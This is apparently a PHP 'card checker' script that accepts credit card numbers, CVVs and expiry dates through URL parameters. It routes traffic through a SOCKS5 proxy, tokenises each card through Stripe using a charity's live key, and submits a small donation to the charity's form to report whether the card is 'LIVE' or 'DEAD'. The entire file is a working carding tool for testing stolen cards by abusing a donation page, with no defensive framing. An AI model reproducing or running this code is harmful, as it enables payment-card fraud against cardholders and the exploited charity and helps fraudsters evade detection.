
set_time_limit(0);

error_reporting(0);

date_default_timezone_set('America/Buenos_Aires');



echo 'USAGE: https://localhost.com/api.php?key=KEY&na...roxy=PROXY';

$key = htmlspecialchars($_GET['key']);

$name = htmlspecialchars($_GET['name']);

$surname = htmlspecialchars($_GET['surname']);

$email = htmlspecialchars($_GET['email']);

$cc = htmlspecialchars($_GET['cc']);

$cvv = htmlspecialchars($_GET['cvv']);

$expm = htmlspecialchars($_GET['expm']);

$expy = htmlspecialchars($_GET['expy']);

$proxy = htmlspecialchars($_GET['proxy']);



if($key == "projectrenegagev0.1"){



//PRIMA RICHIESTA CURL

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');

curl_setopt($ch, CURLOPT_HEADER, 0);

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_PROXY, $proxy);

curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

   'Host: api.stripe.com',

   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',

   'Accept: application/json',

   'Referer: https://js.stripe.com/v3/controller-e5a3...9574b.html',

   'Content-Type: application/x-www-form-urlencoded',

   'Connection: keep-alive'));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$surname.'&card[address_line1]=&card[address_city]=&card[address_zip]=10001&card[currency]=USD&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$expm.'&card[exp_year]='.$expy.'&guid=2a88d519-e56f-467a-9c63-c361a277ff54&muid=3190efac-5abc-4dac-9a48-03367b5b0064&sid=300c2fa4-1b47-44d1-8dfa-e0eb6728f2c3&payment_user_agent=stripe.js%2Fb78d06c%3B+stripe-js-v3%2Fb78d06c&referrer=https%3A%2F%2Fsecure.avaaz.org%2Fdonate%2Fpub-iframe.php%2F%3Fcid%3D3116%26lang%3Des%26sourceUrl%3Dhttps%253A%252F%252Fsecure.avaaz.org%252Fes%252Fdonate%252F&key=pk_live_eT3tlxY6x7Nzg9eDNkMYz99F&pasted_fields=number');



$result1 = curl_exec($ch);



$token = trim(strip_tags(getstr($result1,'id": "','"')));





//SECONDA RICHIESTA CURL

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://secure.avaaz.org/donate/DonationStripeSubmit.php?preview=yes');

curl_setopt($ch, CURLOPT_HEADER, 0);

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_PROXY, $proxy);

curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

    'Host: secure.avaaz.org',

    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',

    'Referer: https://secure.avaaz.org/donate/pub-ifra...Fdonate%2F',

    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',

    'X-Requested-With: XMLHttpRequest',

    'Connection: keep-alive'));      

curl_setopt($ch, CURLOPT_POSTFIELDS, 'sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F&cid=3116&pa=0&lang=es&apiKey=&amount=5&currency=USD&amountOtherInput=&donationType=1&firstName='.$name.'&lastName='.$surname.'&Email='.$email.'&CountryID=81&zip=10001&Address=&city=&paymentType=*****&paymentFamily=cc&paymentCardType=&stripeToken='.$token.'&stripeGatewayId=30&supports_history_api=true&secure_validation=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&used_js=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&privacy_policy_text=%3Ca+href%3D%22https%3A%2F%2Fwww.avaaz.org%2Fes%2Fprivacy%22+target%3D%22_blank%22%3EAvaaz+proteger%C3%A1+tu+privacidad%3C%2Fa%3E+y+te+mantendr%C3%A1+al+corriente+de+esta+y+otras+campa%C3%B1as.&privacy_policy_version=');

$result2 = curl_exec($ch);



if (strpos($result2, 'Your card was declined.')){

echo 'CARD DEAD';

} else {

echo 'CARD LIVE';

}

} else {

die('Invalid key');

} 